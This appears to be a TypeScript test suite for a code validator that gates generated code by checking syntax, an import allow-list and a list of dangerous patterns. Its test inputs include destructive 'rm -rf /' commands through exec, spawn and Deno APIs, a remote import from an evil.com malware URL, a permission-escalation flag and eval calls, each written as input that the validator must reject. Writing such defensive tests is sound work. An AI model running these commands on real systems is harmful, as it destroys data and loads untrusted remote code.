/**
 * Tests for MCP Code Validator
 */

import { validateCode, validateSyntax, validateImports, validatePatterns } from '../validator';

describe('Code Validator', () => {
  describe('validateSyntax', () => {
    it('should pass valid TypeScript code', () => {
      const code = `
        const x = 5;
        function test() {
          return x + 1;
        }
      `;
      const result = validateSyntax(code);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should fail on unbalanced braces', () => {
      const code = `function test() { console.log('test');`;
      const result = validateSyntax(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Unbalanced braces');
    });

    it('should fail on unbalanced parentheses', () => {
      const code = `function test( { return 5; }`;
      const result = validateSyntax(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Unbalanced parentheses');
    });

    it('should detect invalid async function syntax', () => {
      const code = `function async test() { return 5; }`;
      const result = validateSyntax(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('function async');
    });
  });

  describe('validateImports', () => {
    it('should allow imports from ./servers/', () => {
      const code = `import { tool } from './servers/search/searchProducts';`;
      const result = validateImports(code);
      expect(result.valid).toBe(true);
    });

    it('should allow imports from ../servers/', () => {
      const code = `import { tool } from '../servers/search/searchProducts';`;
      const result = validateImports(code);
      expect(result.valid).toBe(true);
    });

    it('should allow imports from @/servers/', () => {
      const code = `import { tool } from '@/servers/search/searchProducts';`;
      const result = validateImports(code);
      expect(result.valid).toBe(true);
    });

    it('should block remote imports', () => {
      const code = `import { tool } from 'https://evil.com/malware.ts';`;
      const result = validateImports(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Forbidden import') || e.includes('Remote imports are forbidden'))).toBe(true);
    });

    it('should block npm imports', () => {
      const code = `import axios from 'axios';`;
      const result = validateImports(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Forbidden import') || e.includes('Direct npm imports are forbidden'))).toBe(true);
    });

    it('should block imports from disallowed paths', () => {
      const code = `import { db } from './lib/database';`;
      const result = validateImports(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Forbidden import');
    });

    it('should handle multiple imports', () => {
      const code = `
        import { search } from './servers/search/searchProducts';
        import axios from 'axios';
        import { exec } from 'child_process';
      `;
      const result = validateImports(code);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('validatePatterns', () => {
    it('should block eval()', () => {
      const code = `eval("malicious code");`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('eval()');
    });

    it('should block Function constructor', () => {
      const code = `const fn = Function("return 1");`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Function()');
    });

    it('should block new Function', () => {
      const code = `const fn = new Function("a", "b", "return a + b");`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('new Function()') || e.includes('Function() constructor'))).toBe(true);
    });

    it('should block child_process', () => {
      const code = `import { exec } from 'child_process';`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('child_process');
    });

    it('should block exec()', () => {
      const code = `process.exec("rm -rf /");`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('exec()');
    });

    it('should block spawn()', () => {
      const code = `child.spawn("sh", ["-c", "rm -rf /"]);`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('spawn()');
    });

    it('should block process.exit', () => {
      const code = `process.exit(1);`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('exit()');
    });

    it('should block Deno.run', () => {
      const code = `Deno.run({ cmd: ["rm", "-rf", "/"] });`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Deno.run');
    });

    it('should block Deno.Command', () => {
      const code = `new Deno.Command("rm", { args: ["-rf", "/"] });`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Deno.Command');
    });

    it('should block permission escalation attempts', () => {
      const code = `deno run --allow-run script.ts`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('escalate');
    });

    it('should block dynamic imports', () => {
      const code = `const mod = await import(userInput);`;
      const result = validatePatterns(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Dynamic import()');
    });

    it('should allow safe code', () => {
      const code = `
        const data = await fetchData();
        const results = data.filter(x => x.active);
        return results;
      `;
      const result = validatePatterns(code);
      expect(result.valid).toBe(true);
    });
  });

  describe('validateCode (full pipeline)', () => {
    it('should pass clean code', () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        const results = await searchProducts({ query: 'test', limit: 10 });
        console.log(JSON.stringify(results));
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(true);
    });

    it('should fail on multiple violations', () => {
      const code = `
        import axios from 'axios';
        eval("alert('xss')");
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(1);
    });

    it('should fail on syntax errors', () => {
      const code = `function test() { return 5;`;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('should fail on forbidden imports', () => {
      const code = `
        import { db } from './lib/database';
        const user = await db.query('SELECT * FROM users');
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('Forbidden import');
    });

    it('should fail on dangerous patterns', () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        const code = eval(userInput);
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('eval()');
    });

    it('should accumulate errors from all phases', () => {
      const code = `
        import axios from 'axios';
        function test() { return eval('malicious';
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThanOrEqual(3);
      // Should have: syntax error, forbidden import, dangerous pattern
    });

    it('should allow complex but safe code', () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        import { getOrder } from './servers/woocommerce/getOrder';

        async function processQuery(query: string) {
          const products = await searchProducts({ query, limit: 10 });
          const filtered = products.filter(p => p.inStock);
          return filtered.map(p => ({
            id: p.id,
            name: p.name,
            price: p.price
          }));
        }

        const results = await processQuery('test');
        console.log(JSON.stringify(results));
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(true);
    });
  });
});
